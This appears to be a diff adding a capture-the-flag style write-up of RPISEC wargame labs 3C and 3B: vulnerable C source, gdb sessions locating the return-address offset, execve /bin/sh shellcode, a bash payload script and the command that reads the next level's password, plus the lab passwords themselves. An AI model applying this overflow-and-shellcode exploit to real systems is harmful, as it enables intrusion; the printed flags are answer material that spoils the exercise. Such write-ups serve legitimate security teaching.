@@ -543,7 +543,319 @@ The ```cat - ``` command is for leaving stdin open.
 D1d_y0u_enj0y_y0ur_cats?
 ```
 
+## lab 3C
+### Recon
+
+Labs in level 3 are focussed on shellcoding and this time we have access to source code files of challs.
+
+```C
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* gcc -z execstack -fno-stack-protector -o lab3C lab3C.c */
+
+char a_user_name[100];
+
+int verify_user_name()
+{
+    puts("verifying username....\n");
+    return strncmp(a_user_name, "rpisec", 6);
+}
+
+int verify_user_pass(char *a_user_pass)
+{
+    return strncmp(a_user_pass, "admin", 5);
+}
+
+int main()
+{
+    char a_user_pass[64] = {0};
+    int x = 0;
+
+    /* prompt for the username - read 100 byes */
+    printf("********* ADMIN LOGIN PROMPT *********\n");
+    printf("Enter Username: ");
+    fgets(a_user_name, 0x100, stdin);
+
+    /* verify input username */
+    x = verify_user_name()
+    if (x != 0){
+        puts("nope, incorrect username...\n");
+        return EXIT_FAILURE;
+    }
+
+    /* prompt for admin password - read 64 bytes */
+    printf("Enter Password: \n");
+    fgets(a_user_pass, 0x64, stdin);
+
+    /* verify input password */
+    x = verify_user_pass(a_user_pass);
+    if (x == 0 || x != 0){
+        puts("nope, incorrect password...\n");
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+We have a 100 bytes buffer in binary's .bss section and three functions:
+
+1. First verfifies username and checks if first six bytes of input are equal to "ripsec".
+2. Second verifies password with a comparison to "admin".
+3. Third is main function
+        * Input supplied by user is copied to a 0x100 (256) bytes buffer via ```fgets()```
+        * Here is also the major security hole. ```fgets(x, 0x100, stdin)``` does not read 100 bytes, it does read 256 bytes on the address provided by x. This allows for a overflow in .bss section
+
+Here we have our strategy:
+* Provocate an overflow while reading username, while providing first six bytes to be "rpisec" 
+* Since binary doesn't have NX-bit enabled we also can place some shellcode in buffer, prepending a large enough nop slide.
+```
+$ checksec lab3C
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No      0               4       lab3C
+```
+* Since ```fgets()``` will get triggered twice, after providing 256 bytes of username, there will be 100 bytes (enough space!!!) left for shellcode.
+
+An interesting aspect is, that "EXIT_FAILURE"-path in ```main()``` will never be triggered if some bytes not equal to zero have been written to ```x```.
+
+So our payload will look like:
+
+```bash
+#!/bin/bash
+
+username=`printf "rpisec"`
+pattern=`printf "%.sA" {1..249}`
+payload=`printf "%.sB" {1..100}`
+
+echo $username$pattern$payload
+```
+
+
+
 ### Pass Lab3C
 ```
 th3r3_iz_n0_4dm1ns_0n1y_U!
+```
+Let's look at our buffer after second call to ```fgets()``` has been executed:
+
+```
+gdb-peda$ b *0x08048838
+Breakpoint 1 at 0x8048838
+gdb-peda$ r < /tmp/payload
+[...]
+gdb-peda$ p &a_user_name
+$2 = (<data variable, no debug info> *) 0x8049c40 <a_user_name>
+gdb-peda$ x/256xw 0x8049c40
+0x8049c40 <a_user_name>:        0x73697072      0x41416365      0x41414141      0x41414141
+0x8049c50 <a_user_name+16>:     0x41414141      0x41414141      0x41414141      0x41414141
+0x8049c60 <a_user_name+32>:     0x41414141      0x41414141      0x41414141      0x41414141
+0x8049c70 <a_user_name+48>:     0x41414141      0x41414141      0x41414141      0x41414141
+0x8049c80 <a_user_name+64>:     0x41414141      0x41414141      0x41414141      0x41414141
+0x8049c90 <a_user_name+80>:     0x41414141      0x41414141      0x41414141      0x41414141
+0x8049ca0 <a_user_name+96>:     0x41414141      0x41414141      0x41414141      0x41414141
+0x8049cb0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049cc0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049cd0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049ce0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049cf0:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049d00:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049d10:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049d20:      0x41414141      0x41414141      0x41414141      0x41414141
+0x8049d30:      0x41414141      0x41414141      0x41414141      0x00414141
+```
+ We have fully overwritten the variable and first six bytes are equal to "rpisec":
+
+ ```
+gdb-peda$ x/6c (void *)0x8049c40
+0x8049c40 <a_user_name>:        0x72    0x70    0x69    0x73    0x65    0x63
+gdb-peda$ x/s (void *)0x8049c40
+0x8049c40 <a_user_name>:        "rpisec", 'A' <repeats 194 times>...
+```
+If we continue execution, we should observe a segfault:
+
+```
+gdb-peda$ c
+[...]
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$
+```
+
+Nice, we control EIP, so what's the correct offset to overwrite Return Instruction Ptr?
+
+```
+gdb-peda$ r < /tmp/payload
+[...]
+gdb-peda$ bt
+#0  0x08048838 in main ()
+#1  0x42424242 in ?? ()
+#2  0x42424242 in ?? ()
+#3  0x42424242 in ?? ()
+#4  0x42424242 in ?? ()
+#5  0x00424242 in ?? ()
+#6  0x00000001 in ?? ()
+#7  0xbffff754 in ?? ()
+Backtrace stopped: previous frame inner to this frame (corrupt stack?)
+gdb-peda$ i frame 0
+Stack frame at 0xbffff6c0:
+ eip = 0x8048838 in main; saved eip = 0x42424242
+ called by frame at 0xbffff6c4
+ Arglist at 0xbffff6b8, args:
+ Locals at 0xbffff6b8, Previous frame's sp is 0xbffff6c0
+ Saved registers:
+  ebx at 0xbffff6b0, ebp at 0xbffff6b8, edi at 0xbffff6b4, eip at 0xbffff6bc
+gdb-peda$ x/32xw $esp
+0xbffff650:     0xbffff66c      0x00000064      0xb7fcdc20      0xb7eb8216
+0xbffff660:     0xffffffff      0xbffff68e      0xb7e2fbf8      0x42424242
+0xbffff670:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff680:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff690:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff6a0:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff6b0:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff6c0:     0x42424242      0x42424242      0x42424242      0x00424242
+gdb-peda$ distance 0xbffff66c 0xbffff6bc
+From 0xbffff66c to 0xbffff6bc: 80 bytes, 20 dwords
+gdb-peda$
+```
+
+So offset to RIP is at offset 80 bytes in buffer filled with B's or 20 dwords apart from start of the same. There's a handy feature in radare for accomplsishing that task:
+```
+$ r2 --
+ -- The door is everything..
+[0x00000000]> e asm.bits=32 
+[0x00000000]> gi exec
+[0x00000000]> g
+31c050682f2f7368682f62696e89e3505389e199b00bcd80
+[0x00000000]> q
+lab3C@warzone:/levels/lab03$ echo -n "31c050682f2f7368682f62696e89e3505389e199b00bcd80" | wc -c
+48
+lab3C@warzone:/levels/lab03$ echo "31c050682f2f7368682f62696e89e3505389e199b00bcd80" | sed -e 's/\(..\)/\\x\1/g'
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+So payload will now look like:
+
+```
+$ cat /tmp/lab3C.sh
+#!/bin/bash
+
+username=`printf "rpisec"`
+nopsled=`printf "%.s\x90" {1..12}`
+pattern=`printf "%.sA" {1..213}`
+payload=`printf "%.sB" {1..80}`
+shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
+echo $username$nopsled$shellcode$pattern$payload
+lab3C@warzone:/levels/lab03$ /tmp/lab3C.sh > /tmp/payload                                             
+lab3C@warzone:/levels/lab03$ hexdump -C /tmp/payload
+00000000  72 70 69 73 65 63 90 90  90 90 90 90 90 90 90 90  |rpisec..........|
+00000010  90 90 31 c0 50 68 2f 2f  73 68 68 2f 62 69 6e 89  |..1.Ph//shh/bin.|
+00000020  e3 50 53 89 e1 99 b0 0b  cd 80 41 41 41 41 41 41  |.PS.......AAAAAA|
+00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+000000f0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 42  |AAAAAAAAAAAAAAAB|
+00000100  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|
+*
+00000140  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 0a  |BBBBBBBBBBBBBBB.|
+```
+
+Disassembly near first call to ```fgets()``` reveals, that our buffer (username) will be stored at 0x8049c40 (.data section):
+
+```
+ 0x80487e0 <main+80>: mov    DWORD PTR [esp],0x8049c40
+=> 0x80487e7 <main+87>: call   0x80485f0 <fgets@plt>
+gdb-peda$ vmmap 0x8049c40
+Start      End        Perm      Name
+0x08049000 0x0804a000 rwxp      /levels/lab03/lab3C
+```
+
+We will use this information to specify the value RIP gets overwritten with. Actually our payload will be generated like this:
+
+```bash
+#!/bin/bash
+
+username=`printf "rpisec"`
+nopsled=`printf "%.s\x90" {1..12}`
+pattern=`printf "%.sA" {1..213}`
+payload=`printf "%.sB" {1..80}`
+shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
+rip=`printf "\x48\x9c\x04\x08"`
+echo $username$nopsled$shellcode$pattern$payload$rip
+```
+
+Finally we need to execute our exploit as such:
+
+```
+$ (cat /tmp/payload; cat) | ./lab3C
+cat /home/lab3B/.pass
+th3r3_iz_n0_4dm1ns_0n1y_U!
+```
+
+### Pass Lab3B
+```
+th3r3_iz_n0_4dm1ns_0n1y_U!
+```
+## Lab 3B
+### Recon
+
+```C
+#include <signal.h>
+#include <assert.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <sys/reg.h>
+#include <sys/prctl.h>
+#include <wait.h>
+#include "utils.h"
+
+ENABLE_TIMEOUT(60)
+
+/* gcc -z execstack -fno-stack-protector -o lab3B lab3B.c */
+
+/* hint: write shellcode that opens and reads the .pass file.
+   ptrace() is meant to deter you from using /bin/sh shellcode */
+
+int main()
+{
+    pid_t child = fork();
+    char buffer[128] = {0};
+    int syscall = 0;
+    int status = 0;
+
+    if(child == 0)
+    {
+        prctl(PR_SET_PDEATHSIG, SIGHUP);
+        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+
+        /* this is all you need to worry about */
+        puts("just give me some shellcode, k");
+        gets(buffer);
+    }
+    else
+    {
+        /* mini exec() sandbox, you can ignore this */
+        while(1)
+        {
+            wait(&status);
+            if (WIFEXITED(status) || WIFSIGNALED(status)){
+                puts("child is exiting...");
+                break;
+            }
+
+            /* grab the syscall # */
+            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);
+
+            /* filter out syscall 11, exec */
+            if(syscall == 11)
+            {
+                printf("no exec() for you\n");
+                kill(child, SIGKILL);
+                break;
+            }
+        }
+    }
+
+    return EXIT_SUCCESS;
+}
 ```
